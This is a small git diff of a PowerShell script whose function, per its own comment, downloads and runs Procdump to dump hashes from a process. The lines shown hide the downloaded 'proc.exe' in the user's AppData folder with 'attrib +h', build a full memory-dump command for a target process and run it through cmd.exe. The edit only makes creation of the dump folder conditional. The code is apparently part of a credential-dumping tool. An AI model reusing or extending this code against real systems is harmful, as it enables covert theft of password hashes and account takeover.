@@ -61,7 +61,8 @@ Function ProccessDumpCommand { # Download and execute Procdump. Dump hash from p
 			Write-Host "ProcessDump 64..." -ForegroundColor DarkGreen
 			attrib +h "$env:userprofile\AppData\proc.exe"
 			}
-		New-Item -Path "$env:userprofile\AppData" -Name "dump" -ItemType "directory"
+		$exists = "$env:userprofile\AppData\dump"
+		if (Test-Path $exists){ } else {New-Item -Path "$env:userprofile\AppData" -Name "dump" -ItemType "directory" }
 		$cmd = "$env:userprofile\AppData\proc.exe -accepteula -ma $process $env:userprofile\AppData\dump\$dumpfile.dmp"
 		[string] $CmdPath = "$env:windir\System32\cmd.exe"
         [string] $CmdString = "$CmdPath" + " /C " + "$cmd"
